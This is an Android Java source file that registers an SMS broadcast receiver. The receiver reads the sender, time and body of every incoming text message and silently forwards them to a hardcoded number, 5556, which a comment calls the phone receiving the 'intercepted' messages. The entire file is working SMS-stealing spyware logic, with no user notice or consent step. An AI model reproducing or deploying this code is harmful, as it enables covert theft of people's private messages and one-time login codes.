package ReceiverPackage;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by john on 2017/4/25.
 */

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // 监听短信广播
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Object[] pdus = (Object[]) intent.getExtras().get("pdus");// 获取短信内容
            for (Object pdu : pdus) {
                byte[] data = (byte[]) pdu;
                SmsMessage message = SmsMessage.createFromPdu(data);// 使用pdu格式的短信数据生成短信对象
                String sender = message.getOriginatingAddress();// 获取短信的发送者
                String content = message.getMessageBody();// 获取短信的内容
                Date date = new Date(message.getTimestampMillis());
                SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

                String sendtime = format.format(date);
                SmsManager manager = SmsManager.getDefault();
                manager.sendTextMessage("5556", null, "发送人:" + sender
                                + "-----发送时间:" + sendtime + "----内容:" + content, null,
                        null);// 把拦截到的短信发送到你指定的手机，此处为5556
            }
        }
    }
}
